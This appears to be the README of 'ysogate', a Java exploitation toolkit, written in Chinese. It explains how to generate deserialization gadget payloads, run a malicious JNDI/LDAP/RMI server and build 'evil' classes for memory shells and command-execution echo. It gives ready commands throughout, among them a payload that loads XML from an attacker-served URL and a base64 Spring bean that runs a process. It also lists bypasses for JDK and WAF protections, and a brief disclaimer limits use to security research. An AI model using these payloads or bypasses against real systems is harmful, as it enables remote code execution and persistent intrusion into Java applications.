# ysogate

ysogate是一个java综合利用工具，支持JNDI注入相关利用，包含多种高版本jdk绕过方式，且支持片段化gadget生成和组合。

- 生成多种Java反序列化gadget payload
- 支持JNDI/LDAP/RMI/JRMP等多种利用方式
- 灵活的命令行界面，支持多种操作模式
- 可扩展的架构，便于添加新的gadget和攻击向量
- 支持多种高版本jdk绕过方式
- 支持扩展利用方式，如内存马，回显，代理等

## Usage

分为两种模式，指定`-m jndi`来启动 JNDI Server，指定`-m payload`来生成反序列化payload，指定`-m gen`来生成恶意类

```bash
[root]#~  H4cking to the Gate !
[root]#~  Usage:
[root]#~  Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]
[root]#~  JNDI    Mode: java -jar ysogate-[version]-all.jar -m jndi    [JNDI OPTIONS]
[root]#~  Gen     Mode: java -jar ysogate-[version]-all.jar -m gen     [GEN OPTIONS]
```
## Payload Mode
可以使用`-m payload`来使用payload模式，这个模式下会生成自定义的反序列化payload

例如输出base64编码的payload

```
java -jar ysogate-[version]-all.jar -m payload -g Jackson1 -p calc -b64
```
使用`-ol`来输出 overlong UTF-8 encoding
```
-m payload -g Jackson1 -p calc -b64 -ol
```
新增SpringAOP利用链
```
# 加载字节码
-m payload -g SpringAOPWithTemplates -p "notepad" -b64
# 加载xml
-m payload -g SpringAOPWithXml -p "http://127.0.0.1:8000/666" -b64
# 写文件
-m payload -g SpringAOPWithFileWrite -p "/tmp/evil.xml;PGJlYW5zIHhtbG5zPSJodHRwOi8vd3d3LnNwcmluZ2ZyYW1ld29yay5vcmcvc2NoZW1hL2JlYW5zIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4c2k6c2NoZW1hTG9jYXRpb249Imh0dHA6Ly93d3cuc3ByaW5nZnJhbWV3b3JrLm9yZy9zY2hlbWEvYmVhbnMgaHR0cDovL3d3dy5zcHJpbmdmcmFtZXdvcmsub3JnL3NjaGVtYS9iZWFucy9zcHJpbmctYmVhbnMueHNkIj4NCiAgPGJlYW4gaWQ9InBiIiBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIiBpbml0LW1ldGhvZD0ic3RhcnQiPg0KICAgIDxjb25zdHJ1Y3Rvci1hcmc+DQogICAgICA8bGlzdD4NCiAgICAgICAgPHZhbHVlPmNhbGM8L3ZhbHVlPg0KICAgICAgPC9saXN0Pg0KICAgIDwvY29uc3RydWN0b3ItYXJnPg0KICA8L2JlYW4+DQo8L2JlYW5zPg==" -b64
```

更多用法参考 [PayloadMode](docs/PayloadMode.md)
## JNDI Mode
可以使用`-m jndi`来使用jndi模式，这个模式会在本地运行恶意的jndi服务器

```
[root]#~  JNDI Mode Options:
 -h,--help              Show help message
 -hp,--httpPort <arg>   HTTP port
 -i,--ip <arg>          IP address for JNDI server
 -ldap2rmi              change ldap to rmi to bypass trustSerialData
 -lp,--ldapPort <arg>   LDAP port
 -m,--mode <arg>        Operation mode: 'payload' or 'jndi' or 'gen'
 -onlyRef               use Reference only to bypass trustSerialData
 -rp,--rmiPort <arg>    RMI port
```

例如

```
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
```
更多用法参考 [JNDIMode](docs/JNDIMode.md)
## Gen Mode
可以使用`-m gen`来使用gen模式，用于生成恶意类

```
[root]#~  Gen Mode Options:
 -bypass                   ByPass JDK Module
 -f,--format <arg>         Output format
 -h,--help                 Show help message
 -m,--mode <arg>           Operation mode: 'payload' or 'jndi' or 'gen'
 -name,--classname <arg>   Evil Class Name
 -s,--sink <arg>           Evil sink template
 -t,--type <arg>           Middleware type
```

示例，生成springmvc的命令执行回显，添加-bypass绕过jdk高版本限制，适用于jdk17

```
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -bypass
```
更多用法参考 [GenMode](docs/GenMode.md)
## Todo
- [x] 基础的反序列化生成payload
- [x] 增加JNDI/LDAP/RMI/JRMP等利用方式
- [x] 绕过trustSerialData
- [x] 完善第三方库的gadget
- [x] 添加中间件回显
- [x] 在加载字节码方面增加扩展攻击如回显，内存马，代理等
- [ ] 补充RMI反序列化的利用
- [x] 防护绕过方面的补充，增加OverlongUTF8/脏数据等绕过
- [ ] 反序列化反弹shell优化
- [ ] LDAPS协议支持



## 免责声明
本项目仅面向安全研究与学习，禁止任何非法用途

如您在使用本项目的过程中存在任何非法行为，您需自行承担相应后果

除非您已充分阅读、完全理解并接受本协议，否则，请您不要使用本项目



## Reference

 - https://github.com/frohoff/ysoserial
 - https://github.com/X1r0z/JNDIMap
 - https://tttang.com/archive/1405/